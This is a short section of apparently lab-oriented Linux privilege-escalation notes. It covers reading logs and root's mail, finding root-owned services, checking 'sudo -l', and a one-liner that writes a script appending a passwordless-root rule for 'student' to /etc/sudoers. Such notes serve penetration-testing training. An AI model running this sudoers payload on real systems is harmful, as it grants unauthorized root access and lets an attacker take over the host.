# 4⃣ Logs

A running Linux server is a complicated beast with dozens of things happening in the background. Admins might at times forget to clean up the system properly when they install/update/remove things. Most of the times, these scenarios can be debugged with error logs. For an attacker, these logs can be a treasure trove! It allows him to understand how everything is running in the server and what kind of errors are happening. Of course, these logs might sometimes be spread over the system in different formats based on the admin's personal preferences.



***

### Check for services running as root

```
ps

ps -ef
```

{% hint style="info" %}
In this case Postfix service is running with root privileges.
{% endhint %}

### Read local mail

```
cat /var/mail/root
```

### Check for permitted commands to run as root

```
sudo -l
```

### Create a missing script with custom code

```
printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /opt/exec.sh
```

